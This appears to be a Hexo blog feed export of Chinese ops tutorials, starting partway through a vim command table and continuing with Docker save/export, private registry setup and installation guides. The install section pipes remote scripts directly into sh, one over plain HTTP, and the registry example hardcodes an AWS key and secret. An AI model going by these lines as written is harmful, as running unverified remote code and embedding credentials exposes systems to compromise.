<td align="left">删至行首</td>
</tr>
<tr>
<td align="left">d$</td>
<td align="left">删至行尾</td>
</tr>
<tr>
<td align="left">dd</td>
<td align="left">删除一行</td>
</tr>
<tr>
<td align="left">ndd</td>
<td align="left">删除当前行及其后n-1行</td>
</tr>
<tr>
<td align="left">dnl</td>
<td align="left">向右删除n个字母</td>
</tr>
<tr>
<td align="left">dnh</td>
<td align="left">向左删除n个字母</td>
</tr>
<tr>
<td align="left">dnj</td>
<td align="left">向下删除n行,当前行+其上n行</td>
</tr>
<tr>
<td align="left">dnk</td>
<td align="left">向上删除n行,当期行+其下n行</td>
</tr>
<tr>
<td align="left">cnw[word]</td>
<td align="left">将n个word改变为word</td>
</tr>
<tr>
<td align="left">C$</td>
<td align="left">改变到行尾</td>
</tr>
<tr>
<td align="left">cc</td>
<td align="left">改变整行</td>
</tr>
<tr>
<td align="left">shift+j</td>
<td align="left">删除行尾的换行符，下一行接上来了</td>
</tr>
</tbody></table>
<h2 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">p</td>
<td align="left">粘贴用x或d删除的文本</td>
</tr>
<tr>
<td align="left">ynw</td>
<td align="left">复制n个单词</td>
</tr>
<tr>
<td align="left">yy</td>
<td align="left">复制一行</td>
</tr>
<tr>
<td align="left">ynl</td>
<td align="left">复制n个字符</td>
</tr>
<tr>
<td align="left">y$</td>
<td align="left">复制当前光标至行尾处</td>
</tr>
<tr>
<td align="left">nyy</td>
<td align="left">拷贝n行</td>
</tr>
</tbody></table>
<h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">u</td>
<td align="left">撤销前一次的操作</td>
</tr>
<tr>
<td align="left">shif+u(U)</td>
<td align="left">撤销对该行的所有操作</td>
</tr>
</tbody></table>
<h2 id="搜索及替换"><a href="#搜索及替换" class="headerlink" title="搜索及替换"></a>搜索及替换</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/pattern</td>
<td align="left">从光标开始处向文件尾搜索pattern</td>
</tr>
<tr>
<td align="left">?pattern</td>
<td align="left">从光标开始处向文件首搜索pattern</td>
</tr>
<tr>
<td align="left">n</td>
<td align="left">在同一方向重复上一次搜索命令</td>
</tr>
<tr>
<td align="left">N</td>
<td align="left">在反方向上重复上一次搜索命令</td>
</tr>
<tr>
<td align="left">cw newword</td>
<td align="left">替换为newword</td>
</tr>
<tr>
<td align="left">n</td>
<td align="left">继续查找</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">执行替换</td>
</tr>
<tr>
<td align="left">:s/p1/p2/g</td>
<td align="left">将当前行中所有p1均用p2替代,g表示执行 用c表示需要确认</td>
</tr>
<tr>
<td align="left">:n1,n2 s/p1/p2/g</td>
<td align="left">将第n1至n2行中所有p1均用p2替代</td>
</tr>
<tr>
<td align="left">:g/p1/s//p2/g</td>
<td align="left">将文件中所有p1均用p2替换</td>
</tr>
<tr>
<td align="left">:1,$ s/string1/string2/g</td>
<td align="left">在全文中将string1替换为string2</td>
</tr>
</tbody></table>
<h2 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">m[a-z]</td>
<td align="left">在文中做标记，标记号可为a-z的26个字母</td>
</tr>
<tr>
<td align="left">`a</td>
<td align="left">移动到标记a处</td>
</tr>
</tbody></table>
<h2 id="visual模式"><a href="#visual模式" class="headerlink" title="visual模式"></a>visual模式</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">v</td>
<td align="left">进入visual 模式</td>
</tr>
<tr>
<td align="left">V</td>
<td align="left">进入行的visual 模式</td>
</tr>
<tr>
<td align="left">ctrl+v</td>
<td align="left">进如块操作模式用o和O改变选择的边的大小</td>
</tr>
<tr>
<td align="left">在所有行插入相同的内容如include&lt;</td>
<td align="left">将光标移到开始插入的位置，按CTRL+V进入VISUAL模式，选择好模块后按I（shift+i)，后插入要插入的文本，按[ESC]完成</td>
</tr>
</tbody></table>
<h2 id="行方式命令"><a href="#行方式命令" class="headerlink" title="行方式命令"></a>行方式命令</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">:n1,n2 co n3</td>
<td align="left">将n1行到n2行之间的内容拷贝到第n3行下</td>
</tr>
<tr>
<td align="left">:n1,n2 m n3</td>
<td align="left">将n1行到n2行之间的内容移至到第n3行下</td>
</tr>
<tr>
<td align="left">:n1,n2 d</td>
<td align="left">将n1行到n2行之间的内容删除</td>
</tr>
<tr>
<td align="left">:n1,n2 w!command</td>
<td align="left">将文件中n1行至n2行的内容作为command的输入并执行之<br>若不指定n1，n2，则表示将整个文件内容作为command的输入</td>
</tr>
</tbody></table>
<h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">q[a-z]</td>
<td align="left">开始记录但前开始的操作为宏，名称可为【a-z】，然后用q终止录制宏</td>
</tr>
<tr>
<td align="left">reg</td>
<td align="left">显示当前定义的所有的宏，用@[a-z]来在当前光标处执行宏[a-z]</td>
</tr>
</tbody></table>
<h2 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">:split</td>
<td align="left">分割一个窗口</td>
</tr>
<tr>
<td align="left">:split file.c</td>
<td align="left">为另一个文件file.c分隔窗口</td>
</tr>
<tr>
<td align="left">:nsplit file.c</td>
<td align="left">为另一个文件file.c分隔窗口，并指定其行数</td>
</tr>
<tr>
<td align="left">ctrl＋w</td>
<td align="left">在窗口中切换</td>
</tr>
<tr>
<td align="left">:close</td>
<td align="left">关闭当前窗口</td>
</tr>
</tbody></table>
<h2 id="文件及其他"><a href="#文件及其他" class="headerlink" title="文件及其他"></a>文件及其他</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">:q</td>
<td align="left">退出vi</td>
</tr>
<tr>
<td align="left">:q!</td>
<td align="left">不保存文件并退出vi</td>
</tr>
<tr>
<td align="left">:e filename</td>
<td align="left">打开文件filename进行编辑</td>
</tr>
<tr>
<td align="left">:e!</td>
<td align="left">放弃修改文件内容，重新载入该文件编辑</td>
</tr>
<tr>
<td align="left">:w</td>
<td align="left">保存当前文件</td>
</tr>
<tr>
<td align="left">:wq</td>
<td align="left">存盘退出</td>
</tr>
<tr>
<td align="left">:ZZ</td>
<td align="left">保存当前文档并退出VIM</td>
</tr>
<tr>
<td align="left">:!command</td>
<td align="left">执行shell命令command</td>
</tr>
<tr>
<td align="left">:r!command</td>
<td align="left">将命令command的输出结果放到当前行</td>
</tr>
<tr>
<td align="left">:n1,n2 write temp.c</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">:read file.c</td>
<td align="left">将文件file.c的内容插入到当前光标所在的下面</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>docker备份恢复之save与export</title>
    <url>//docker-save-export</url>
    <content><![CDATA[<h2 id="docker-save"><a href="#docker-save" class="headerlink" title="docker save"></a>docker save</h2><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p><code>docker save</code> 命令用于持久化 <strong>镜像</strong>，先获得镜像名称，再执行保存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过此命令查出要持久化的镜像名称</span></span><br><span class="line">$ docker images</span><br><span class="line"><span class="comment"># 持久化镜像名为 image_name 的镜像，</span></span><br><span class="line">$ docker save image_name -o ~/save.tar</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意：</strong> 如果镜像是在远程仓库，执行保存镜像的时候可能会报 <code>Cowardly refusing to save to a terminal. Use the -o flag or redirect.</code> 的错，可以通过 <code>docker save image_name &gt; image_name.tar</code> 将镜像从远程仓库持久化到本地。</p>
</blockquote>
<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入 save.tar</span></span><br><span class="line">$ docker load &lt; ~/save.tar</span><br><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">$ docker images images</span><br></pre></td></tr></table></figure>

<h2 id="docker-export"><a href="#docker-export" class="headerlink" title="docker export"></a>docker export</h2><h3 id="导出-1"><a href="#导出-1" class="headerlink" title="导出"></a>导出</h3><p><code>docker export</code> 命令用于持久化 <strong>容器</strong>，先获取容器ID，再执行保存。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过此命令查出要持久化的容器ID</span></span><br><span class="line">$ docker ps -a</span><br><span class="line"><span class="comment"># 持久化容器id为 container_id 的容器</span></span><br><span class="line">$ docker <span class="built_in">export</span> container_id &gt; ~/export.tar</span><br></pre></td></tr></table></figure>
<h3 id="导入-1"><a href="#导入-1" class="headerlink" title="导入"></a>导入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从 export.tar 导入镜像</span></span><br><span class="line">$ cat ~/export.tar | docker import - my-images:latest</span><br><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">$ sudo docker images</span><br></pre></td></tr></table></figure>

<h2 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h2><p>通过 <code>sudo docker images --tree</code> 可以查看到镜像的所有层，就会发现， <code>docker export</code> 丢失了所有的历史，而<code>docker save</code> 则会保存所有历史。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker仓库</title>
    <url>//docker-registry</url>
    <content><![CDATA[<h2 id="Docker-Hub"><a href="#Docker-Hub" class="headerlink" title="Docker Hub"></a>Docker Hub</h2><p>目前 Docker 官方维护了一个公共仓库 <a href="https://hub.docker.com/">Docker Hub</a>，其中已经包括了超过 15,000 的镜像。大部分需求，都可以通过在 Docker Hub 中直接下载镜像来实现。</p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>可以通过执行 docker login 命令来输入用户名、密码和邮箱来完成注册和登录。 注册成功后，本地用户目录的 .dockercfg 中将保存用户的认证信息。</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>用户无需登录即可通过 docker search 命令来查找官方仓库中的镜像，并利用 docker pull 命令来将它下载到本地。</p>
<p>例如以 centos 为关键词进行搜索：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker search centos</span><br><span class="line">NAME                                            DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">centos                                          The official build of CentOS.                   465       [OK]</span><br><span class="line">tianon/centos                                   CentOS 5 and 6, created using rinse instea...   28</span><br><span class="line">blalor/centos                                   Bare-bones base CentOS 6.5 image                6                    [OK]</span><br><span class="line">saltstack/centos-6-minimal                                                                      6                    [OK]</span><br><span class="line">tutum/centos-6.4                                DEPRECATED. Use tutum/centos:6.4 instead. ...   5                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到返回了很多包含关键字的镜像，其中包括镜像名字、描述、星级（表示该镜像的受欢迎程度）、是否官方创建、是否自动创建。 官方的镜像说明是官方项目组创建和维护的，automated 资源允许用户验证镜像的来源和内容。</p>
<p>根据是否是官方提供，可将镜像资源分为两类。 一种是类似 centos 这样的基础镜像，被称为基础或根镜像。这些基础镜像是由 Docker 公司创建、验证、支持、提供。这样的镜像往往使用单个单词作为名字。 还有一种类型，比如 tianon/centos 镜像，它是由 Docker 的用户创建并维护的，往往带有用户名称前缀。可以通过前缀 user_name/ 来指定使用某个用户提供的镜像，比如 tianon 用户。</p>
<p>另外，在查找的时候通过 -s N 参数可以指定仅显示评价为 N 星以上的镜像。</p>
<p>下载官方 centos 镜像到本地。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker pull centos</span><br><span class="line">Pulling repository centos</span><br><span class="line">0b443ba03958: Download complete</span><br><span class="line">539c0211cd76: Download complete</span><br><span class="line">511136ea3c5a: Download complete</span><br><span class="line">7064731afe90: Download complete</span><br></pre></td></tr></table></figure>
<p>用户也可以在登录后通过 docker push 命令来将镜像推送到 Docker Hub。</p>
<h2 id="私有仓库"><a href="#私有仓库" class="headerlink" title="私有仓库"></a>私有仓库</h2><h3 id="安装-docker-registry"><a href="#安装-docker-registry" class="headerlink" title="安装 docker-registry"></a>安装 docker-registry</h3><h4 id="容器运行"><a href="#容器运行" class="headerlink" title="容器运行"></a>容器运行</h4><p>在安装了 Docker 后，可以通过获取官方 registry 镜像来运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -p 5000:5000 registry</span><br></pre></td></tr></table></figure>
<p>这将使用官方的 registry 镜像来启动本地的私有仓库。 用户可以通过指定参数来配置私有仓库位置，例如配置镜像存储到 Amazon S3 服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run \</span><br><span class="line">         -e SETTINGS_FLAVOR=s3 \</span><br><span class="line">         -e AWS_BUCKET=acme-docker \</span><br><span class="line">         -e STORAGE_PATH=/registry \</span><br><span class="line">         -e AWS_KEY=AKIAHSHB43HS3J92MXZ \</span><br><span class="line">         -e AWS_SECRET=xdDowwlK7TJajV1Y7EoOZrmuPEJlHYcNP2k4j49T \</span><br><span class="line">         -e SEARCH_BACKEND=sqlalchemy \</span><br><span class="line">         -p 5000:5000 \</span><br><span class="line">         registry</span><br></pre></td></tr></table></figure>
<p>此外，还可以指定本地路径（如 /home/user/registry-conf ）下的配置文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -p 5000:5000 -v /home/user/registry-conf:/registry-conf -e DOCKER_REGISTRY_CONFIG=/registry-conf/config.yml registry</span><br></pre></td></tr></table></figure>
<p>默认情况下，仓库会被创建在容器的 /tmp/registry 下。可以通过 -v 参数来将镜像文件存放在本地的指定路径。 例如下面的例子将上传的镜像放到 /opt/data/registry 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -d -p 5000:5000 -v /opt/data/registry:/tmp/registry registry</span><br></pre></td></tr></table></figure>
<h4 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h4><p>对于 Ubuntu 或 CentOS 等发行版，可以直接通过源安装。<br>1.Ubuntu</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y build-essential python-dev libevent-dev python-pip liblzma-dev</span><br><span class="line">$ sudo pip install docker-registry</span><br></pre></td></tr></table></figure>
<p>2.CentOS</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo yum install -y python-devel libevent-devel python-pip gcc xz-devel</span><br><span class="line">$ sudo python-pip install docker-registry</span><br></pre></td></tr></table></figure>
<p>3.源码安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install build-essential python-dev libevent-dev python-pip libssl-dev liblzma-dev libffi-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/docker/docker-registry.git</span><br><span class="line">$ <span class="built_in">cd</span> docker-registry</span><br><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure>
<p>然后修改配置文件，主要修改 dev 模板段的 storage_path 到本地的存储仓库的路径。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cp config/config_sample.yml config/config.yml</span><br></pre></td></tr></table></figure>
<p>之后启动 Web 服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo gunicorn -c contrib/gunicorn.py docker_registry.wsgi:application</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo gunicorn --access-logfile - --error-logfile - -k gevent -b 0.0.0.0:5000 -w 4 --max-requests 100 docker_registry.wsgi:application</span><br></pre></td></tr></table></figure>
<p>此时使用 curl 访问本地的 5000 端口，看到输出 docker-registry 的版本信息说明运行成功。</p>
<blockquote>
<p><em>注：config/config_sample.yml 文件是示例配置文件。</em></p>
</blockquote>
<h3 id="在私有仓库上传、下载、搜索镜像"><a href="#在私有仓库上传、下载、搜索镜像" class="headerlink" title="在私有仓库上传、下载、搜索镜像"></a>在私有仓库上传、下载、搜索镜像</h3><p>创建好私有仓库之后，就可以使用 docker tag 来标记一个镜像，然后推送它到仓库，别的机器上就可以下载下来了。例如私有仓库地址为 192.168.7.26:5000。</p>
<p>先在本机查看已有的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker images</span><br><span class="line">REPOSITORY                        TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">ubuntu                            latest              ba5877dc9bec        6 weeks ago         192.7 MB</span><br><span class="line">ubuntu                            14.04               ba5877dc9bec        6 weeks ago         192.7 MB</span><br></pre></td></tr></table></figure>
<p>使用docker tag 将 ba58 这个镜像标记为 192.168.7.26:5000/test（格式为 docker tag IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker tag ba58 192.168.7.26:5000/<span class="built_in">test</span></span><br><span class="line">root ~ <span class="comment"># docker images</span></span><br><span class="line">REPOSITORY                        TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">ubuntu                            14.04               ba5877dc9bec        6 weeks ago         192.7 MB</span><br><span class="line">ubuntu                            latest              ba5877dc9bec        6 weeks ago         192.7 MB</span><br><span class="line">192.168.7.26:5000/<span class="built_in">test</span>            latest              ba5877dc9bec        6 weeks ago         192.7 MB</span><br></pre></td></tr></table></figure>
<p>使用 docker push 上传标记的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker push 192.168.7.26:5000/<span class="built_in">test</span></span><br><span class="line">The push refers to a repository [192.168.7.26:5000/<span class="built_in">test</span>] (len: 1)</span><br><span class="line">Sending image list</span><br><span class="line">Pushing repository 192.168.7.26:5000/<span class="built_in">test</span> (1 tags)</span><br><span class="line">Image 511136ea3c5a already pushed, skipping</span><br><span class="line">Image 9bad880da3d2 already pushed, skipping</span><br><span class="line">Image 25f11f5fb0cb already pushed, skipping</span><br><span class="line">Image ebc34468f71d already pushed, skipping</span><br><span class="line">Image 2318d26665ef already pushed, skipping</span><br><span class="line">Image ba5877dc9bec already pushed, skipping</span><br><span class="line">Pushing tag <span class="keyword">for</span> rev [ba5877dc9bec] on &#123;http://192.168.7.26:5000/v1/repositories/<span class="built_in">test</span>/tags/latest&#125;</span><br></pre></td></tr></table></figure>

<p>用 curl 查看仓库中的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://192.168.7.26:5000/v1/search</span><br><span class="line">&#123;<span class="string">&quot;num_results&quot;</span>: 7, <span class="string">&quot;query&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;results&quot;</span>: [&#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/miaxis_j2ee&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/tomcat&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/ubuntu&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/ubuntu_office&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/desktop_ubu&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;dockerfile/ubuntu&quot;</span>&#125;, &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;library/test&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到 {“description”: “”, “name”: “library/test”}，表明镜像已经被成功上传了。</p>
<p>现在可以到另外一台机器去下载这个镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker pull 192.168.7.26:5000/<span class="built_in">test</span></span><br><span class="line">Pulling repository 192.168.7.26:5000/<span class="built_in">test</span></span><br><span class="line">ba5877dc9bec: Download complete</span><br><span class="line">511136ea3c5a: Download complete</span><br><span class="line">9bad880da3d2: Download complete</span><br><span class="line">25f11f5fb0cb: Download complete</span><br><span class="line">ebc34468f71d: Download complete</span><br><span class="line">2318d26665ef: Download complete</span><br><span class="line">$ sudo docker images</span><br><span class="line">REPOSITORY                         TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">192.168.7.26:5000/<span class="built_in">test</span>             latest              ba5877dc9bec        6 weeks ago         192.7 MB</span><br></pre></td></tr></table></figure>
<p>可以使用 <a href="https://github.com/yeasy/docker_practice/raw/master/_local/push_images.sh">这个脚本</a> 批量上传本地的镜像到注册服务器中，默认是本地注册服务器 127.0.0.1:5000。例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget https://github.com/yeasy/docker_practice/raw/master/_local/push_images.sh; sudo chmod a+x push_images.sh</span><br><span class="line">$ ./push_images.sh ubuntu:latest centos:centos7</span><br><span class="line">The registry server is 127.0.0.1</span><br><span class="line">Uploading ubuntu:latest...</span><br><span class="line">The push refers to a repository [127.0.0.1:5000/ubuntu] (len: 1)</span><br><span class="line">Sending image list</span><br><span class="line">Pushing repository 127.0.0.1:5000/ubuntu (1 tags)</span><br><span class="line">Image 511136ea3c5a already pushed, skipping</span><br><span class="line">Image bfb8b5a2ad34 already pushed, skipping</span><br><span class="line">Image c1f3bdbd8355 already pushed, skipping</span><br><span class="line">Image 897578f527ae already pushed, skipping</span><br><span class="line">Image 9387bcc9826e already pushed, skipping</span><br><span class="line">Image 809ed259f845 already pushed, skipping</span><br><span class="line">Image 96864a7d2df3 already pushed, skipping</span><br><span class="line">Pushing tag <span class="keyword">for</span> rev [96864a7d2df3] on &#123;http://127.0.0.1:5000/v1/repositories/ubuntu/tags/latest&#125;</span><br><span class="line">Untagged: 127.0.0.1:5000/ubuntu:latest</span><br><span class="line">Done</span><br><span class="line">Uploading centos:centos7...</span><br><span class="line">The push refers to a repository [127.0.0.1:5000/centos] (len: 1)</span><br><span class="line">Sending image list</span><br><span class="line">Pushing repository 127.0.0.1:5000/centos (1 tags)</span><br><span class="line">Image 511136ea3c5a already pushed, skipping</span><br><span class="line">34e94e67e63a: Image successfully pushed</span><br><span class="line">70214e5d0a90: Image successfully pushed</span><br><span class="line">Pushing tag <span class="keyword">for</span> rev [70214e5d0a90] on &#123;http://127.0.0.1:5000/v1/repositories/centos/tags/centos7&#125;</span><br><span class="line">Untagged: 127.0.0.1:5000/centos:centos7</span><br><span class="line">Done</span><br></pre></td></tr></table></figure>

<h2 id="仓库配置文件"><a href="#仓库配置文件" class="headerlink" title="仓库配置文件"></a>仓库配置文件</h2><p>Docker 的 Registry 利用配置文件提供了一些仓库的模板（flavor），用户可以直接使用它们来进行开发或生产部署。</p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>在 config_sample.yml 文件中，可以看到一些现成的模板段：</p>
<ul>
<li>common：基础配置</li>
<li>local：存储数据到本地文件系统</li>
<li>s3：存储数据到 AWS S3 中</li>
<li>dev：使用 local 模板的基本配置</li>
<li>test：单元测试使用</li>
<li>prod：生产环境配置（基本上跟s3配置类似）</li>
<li>gcs：存储数据到 Google 的云存储</li>
<li>swift：存储数据到 OpenStack Swift 服务</li>
<li>glance：存储数据到 OpenStack Glance 服务，本地文件系统为后备</li>
<li>glance-swift：存储数据到 OpenStack Glance 服务，Swift 为后备</li>
<li>elliptics：存储数据到 Elliptics key/value 存储</li>
</ul>
<p>用户也可以添加自定义的模版段。</p>
<p>默认情况下使用的模板是 dev，要使用某个模板作为默认值，可以添加 SETTINGS_FLAVOR 到环境变量中，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export SETTINGS_FLAVOR=dev</span><br></pre></td></tr></table></figure>
<p>另外，配置文件中支持从环境变量中加载值，语法格式为 <code>_env:VARIABLENAME[:DEFAULT]</code>。</p>
<h3 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">common:</span><br><span class="line">    loglevel: info</span><br><span class="line">    search_backend: &quot;_env:SEARCH_BACKEND:&quot;</span><br><span class="line">    sqlalchemy_index_database:</span><br><span class="line">        &quot;_env:SQLALCHEMY_INDEX_DATABASE:sqlite:////tmp/docker-registry.db&quot;</span><br><span class="line"></span><br><span class="line">prod:</span><br><span class="line">    loglevel: warn</span><br><span class="line">    storage: s3</span><br><span class="line">    s3_access_key: _env:AWS_S3_ACCESS_KEY</span><br><span class="line">    s3_secret_key: _env:AWS_S3_SECRET_KEY</span><br><span class="line">    s3_bucket: _env:AWS_S3_BUCKET</span><br><span class="line">    boto_bucket: _env:AWS_S3_BUCKET</span><br><span class="line">    storage_path: /srv/docker</span><br><span class="line">    smtp_host: localhost</span><br><span class="line">    from_addr: docker@myself.com</span><br><span class="line">    to_addr: my@myself.com</span><br><span class="line"></span><br><span class="line">dev:</span><br><span class="line">    loglevel: debug</span><br><span class="line">    storage: local</span><br><span class="line">    storage_path: /home/myself/docker</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">    storage: local</span><br><span class="line">    storage_path: /tmp/tmpdockertmp</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>docker初体验</title>
    <url>//docker-first</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="笔者环境"><a href="#笔者环境" class="headerlink" title="笔者环境"></a>笔者环境</h3><p>操作系统：deepin 15.4 Desktop 64Bit</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方 的安装脚本</span></span><br><span class="line">$ curl -sSL https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云 的安装脚本</span></span><br><span class="line">$ curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span><br><span class="line"></span><br><span class="line"><span class="comment"># DaoCloud 的安装脚本</span></span><br><span class="line">$ curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>
<h3 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h3><p><a href="https://hub.docker.com/explore/">Docker Hub</a> 上有大量的高质量的镜像可以用，这里我们就说一下怎么获取这些镜像并运行。<br>从 Docker Registry 获取镜像的命令是 docker pull。其命令格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</span><br></pre></td></tr></table></figure>
<p>具体的选项可以通过 <code>docker pull --help</code> 命令看到，这里我们说一下镜像名称的格式。</p>
<ul>
<li>Docker Registry地址：地址的格式一般是 <code>&lt;域名/IP&gt;[:端口号]</code>。默认地址是 <code>Docker Hub</code>。</li>
<li>仓库名：如之前所说，这里的仓库名是两段式名称，既 <code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo docker pull ubuntu</span><br></pre></td></tr></table></figure>

<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>有了镜像后，我们就可以以这个镜像为基础启动一个容器来运行。以上面的 <code>ubuntu</code> 为例，如果我们打算启动里面的 <code>bash</code> 并且进行交互式操作的话，可以执行下面的命令。</p>
